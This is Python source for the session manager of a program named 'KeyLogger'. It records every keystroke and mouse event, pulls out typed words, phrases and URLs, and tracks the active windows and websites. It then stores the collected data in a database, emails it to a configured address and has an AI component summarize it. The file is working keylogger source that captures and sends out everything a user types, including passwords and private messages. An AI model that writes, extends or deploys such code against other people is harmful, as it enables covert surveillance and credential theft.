"""
Session management module for KeyLogger
Handles session lifecycle, idle detection, and event aggregation
"""

from datetime import datetime, timedelta
from input_tracker import MouseTracker, KeyboardTracker, WindowTracker
from website_tracker import WebsiteActivityTracker
from input_sequence_tracker import InputSequenceTracker
from pattern_analyzer import PatternAnalyzer
from database import DatabaseManager
from email_reporter import EmailReporter
from ai_summarizer import SessionSummarizer
from config import MAX_IDLE_TIME, EMAIL_ADDRESS, EMAIL_PASSWORD
import threading
import time
import logging

logger = logging.getLogger(__name__)

class SessionManager:
    """Manages KeyLogger session lifecycle"""

    def __init__(self):
        """Initialize session manager"""
        self.mouse_tracker = MouseTracker()
        self.keyboard_tracker = KeyboardTracker()
        self.window_tracker = WindowTracker()
        self.website_activity_tracker = WebsiteActivityTracker()
        self.input_sequence_tracker = InputSequenceTracker()
        self.pattern_analyzer = PatternAnalyzer()
        self.db_manager = DatabaseManager()
        self.email_reporter = EmailReporter(EMAIL_ADDRESS, EMAIL_PASSWORD)
        self.ai_summarizer = SessionSummarizer()

        self.session_active = False
        self.session_start_time = None
        self.last_activity_time = None
        self.idle_checker_thread = None
        self.window_tracker_thread = None
        self.ai_summary = None
        self.last_processed_keyboard_index = 0  # Track keyboard events already processed

    def start_session(self):
        """Start a new tracking session"""
        print("\n" + "="*50)
        print("Starting KeyLogger Session")
        print("="*50)

        self.session_active = True
        self.session_start_time = datetime.now()
        self.last_activity_time = datetime.now()

        # Start input trackers
        self.mouse_tracker.start()
        self.keyboard_tracker.start()

        # Start window tracking thread
        self._start_window_tracker()

        # Start idle detection thread
        self._start_idle_checker()

        print(f"[+] Session started at {self.session_start_time.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"[!] Session will end after {MAX_IDLE_TIME} seconds of inactivity")
        print(f"[!] Press Ctrl+C to manually end session\n")

    def _update_activity(self):
        """Update last activity timestamp"""
        self.last_activity_time = datetime.now()

    def _start_idle_checker(self):
        """Start background thread to check for idle timeout"""
        def check_idle():
            while self.session_active:
                if self.last_activity_time:
                    idle_time = (datetime.now() - self.last_activity_time).total_seconds()

                    if idle_time > MAX_IDLE_TIME:
                        print(f"\n[!] Idle timeout reached ({idle_time:.0f}s > {MAX_IDLE_TIME}s)")
                        self.end_session()
                        break

                time.sleep(1)  # Check every second

        self.idle_checker_thread = threading.Thread(target=check_idle, daemon=True)
        self.idle_checker_thread.start()

    def _start_window_tracker(self):
        """Start background thread to track active windows, websites, keyboard sequence, and extract words/URLs"""
        def track_windows():
            while self.session_active:
                try:
                    # Get ALL keyboard events
                    keyboard_events = self.keyboard_tracker.get_events()

                    # Process only NEW keyboard events
                    new_events = keyboard_events[self.last_processed_keyboard_index:]
                    for event in new_events:
                        key = event.get('key', '')
                        is_special = event.get('is_special', False)

                        # Record in sequence tracker
                        if key:
                            self.input_sequence_tracker.record_key(key, is_special)
                            self.last_activity_time = datetime.now()

                    self.last_processed_keyboard_index = len(keyboard_events)

                    # Track window and words
                    self.window_tracker.track_window_and_words(keyboard_events)

                    # Track which website is currently active
                    import pygetwindow as gw
                    try:
                        active_window = gw.getActiveWindow()
                        if active_window:
                            window_title = active_window.title
                            # Update website tracker with current active window
                            self.website_activity_tracker.update_active_website(window_title)
                    except:
                        pass

                except Exception as e:
                    logger.debug(f"Error in window tracker: {e}")
                time.sleep(0.5)  # Check every 500ms for accurate sequence tracking

        self.window_tracker_thread = threading.Thread(target=track_windows, daemon=True)
        self.window_tracker_thread.start()

    def record_activity(self):
        """Record that activity occurred"""
        self._update_activity()

    def end_session(self):
        """End the current session and generate report"""
        if not self.session_active:
            return

        self.session_active = False

        print("\n" + "="*50)
        print("Ending KeyLogger Session")
        print("="*50)

        # Stop trackers
        self.mouse_tracker.stop()
        self.keyboard_tracker.stop()

        # Calculate session duration
        session_duration = (datetime.now() - self.session_start_time).total_seconds()

        # Get all events
        mouse_events = self.mouse_tracker.get_events()
        keyboard_events = self.keyboard_tracker.get_events()
        words = self.window_tracker.get_words()
        phrases = self.window_tracker.get_phrases()
        urls = list(self.window_tracker.tracked_urls)
        window_events = self.window_tracker.get_events()

        # Extract special keys from keyboard events (only count actual presses, not holds)
        special_keys = [e['key'] for e in keyboard_events if e.get('is_special', False)]

        print(f"\n[*] Session duration: {session_duration:.2f} seconds")
        print(f"[*] Mouse events captured: {len(mouse_events)}")
        print(f"[*] Keyboard events captured: {len(keyboard_events)}")
        print(f"[*] Words extracted: {len(words)}")
        print(f"[*] Special keys pressed: {len(special_keys)}")
        print(f"[*] URLs detected: {len(urls)}")

        # Analyze patterns
        print("[*] Analyzing patterns...")
        patterns = self.pattern_analyzer.analyze(
            mouse_events,
            keyboard_events,
            words=words,
            phrases=phrases,
            window_events=window_events,
            urls=urls,
            special_keys=special_keys
        )

        # Display pattern summary
        summary = self.pattern_analyzer.generate_summary(patterns)
        print(summary)

        # Finalize website activity tracking
        self.website_activity_tracker.finalize_session()
        website_summary = self.website_activity_tracker.get_website_summary()
        websites_visited = self.website_activity_tracker.get_websites_visited()
        url_visit_sequence = self.website_activity_tracker.get_url_visit_sequence()

        # Get input sequence
        input_sequence = self.input_sequence_tracker.get_sequence()
        input_stats = self.input_sequence_tracker.get_key_statistics()

        print(f"\n[*] Websites/URLs tracked: {len(websites_visited)}")
        for i, url in enumerate(websites_visited, 1):
            print(f"    {i}. {url}")

        print(f"[*] Total key presses: {input_stats.get('total_keys', 0)}")
        print(f"    - Letters: {input_stats.get('letters_pressed', 0)}")
        print(f"    - Numbers: {input_stats.get('numbers_pressed', 0)}")
        print(f"    - Spaces: {input_stats.get('spaces_pressed', 0)}")
        print(f"    - Special keys: {input_stats.get('special_keys_pressed', 0)}")

        # Generate AI summary with per-website context
        print("[*] Generating AI summary...")
        self.ai_summary = self.ai_summarizer.generate_summary(
            {
                'duration_seconds': session_duration,
                'total_events': len(mouse_events) + len(keyboard_events),
                'keyboard_events_count': len(keyboard_events),
                'words_extracted': words,
                'urls_detected': urls,
                'websites_visited': websites_visited,
                'website_activities': website_summary
            },
            patterns
        )
        print(self.ai_summary)

        # Prepare session data
        session_data = {
            'start_time': self.session_start_time.isoformat(),
            'end_time': datetime.now().isoformat(),
            'duration_seconds': session_duration,
            'events': mouse_events + keyboard_events + window_events,
            'total_events': len(mouse_events) + len(keyboard_events) + len(window_events),
            'mouse_events_count': len(mouse_events),
            'keyboard_events_count': len(keyboard_events),
            'window_events_count': len(window_events),
            'words_extracted': words,
            'special_keys_pressed': special_keys,
            'input_sequence': input_sequence,
            'input_statistics': input_stats,
            'urls_detected': urls,
            'websites_visited': websites_visited,
            'url_visit_sequence': url_visit_sequence,
            'website_activities': website_summary,
            'patterns': patterns,
            'ai_summary': self.ai_summary
        }

        # Store in database
        print("[*] Storing session data...")
        db_success = self.db_manager.insert_session(session_data)

        # Send email report
        print("[*] Sending email report...")
        email_success = self.email_reporter.send_session_report(
            EMAIL_ADDRESS,
            session_data,
            patterns
        )

        # Final status
        print("\n" + "="*50)
        print("Session Report Summary")
        print("="*50)
        print(f"[✓] Database Storage: {'Success' if db_success else 'Failed/Offline'}")
        print(f"[✓] Email Report: {'Success' if email_success else 'Failed'}")
        print("[*] Session ended at " + datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
        print("="*50 + "\n")

    def get_status(self):
        """Get current session status"""
        if self.session_active:
            elapsed = (datetime.now() - self.session_start_time).total_seconds()
            idle = (datetime.now() - self.last_activity_time).total_seconds()
            return {
                'active': True,
                'elapsed_seconds': elapsed,
                'idle_seconds': idle,
                'mouse_events': len(self.mouse_tracker.get_events()),
                'keyboard_events': len(self.keyboard_tracker.get_events())
            }
        return {'active': False}

    def cleanup(self):
        """Clean up resources"""
        if self.session_active:
            self.end_session()
        self.db_manager.close()
